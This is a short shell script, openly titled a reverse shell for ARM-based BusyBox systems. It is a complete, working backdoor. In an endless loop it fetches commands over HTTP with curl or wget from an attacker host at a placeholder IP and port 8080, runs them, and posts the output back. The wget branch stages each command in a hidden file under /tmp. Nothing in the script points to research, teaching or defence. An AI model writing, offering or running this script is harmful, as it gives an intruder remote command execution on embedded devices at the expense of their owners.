#!/bin/sh

# Reverse Shell for ARM-based BusyBox Systems
# Requirements: curl or wget must be available on the target

REMOTE_HOST="<YOUR_IP>"
REMOTE_PORT=8080

# Try with curl
if command -v curl >/dev/null 2>&1; then
  while :; do
    CMD=$(curl -s http://$REMOTE_HOST:$REMOTE_PORT/cmd)
    RESULT=$(sh -c "$CMD" 2>&1)
    curl -X POST -d "$RESULT" http://$REMOTE_HOST:$REMOTE_PORT/result
    sleep 5
  done

# Try with wget
elif command -v wget >/dev/null 2>&1; then
  while :; do
    wget -qO - http://$REMOTE_HOST:$REMOTE_PORT/cmd > /tmp/.cmd.sh
    RESULT=$(sh /tmp/.cmd.sh 2>&1)
    wget --post-data="$RESULT" http://$REMOTE_HOST:$REMOTE_PORT/result
    sleep 5
  done

else
  echo "Neither curl nor wget found. Cannot continue."
fi
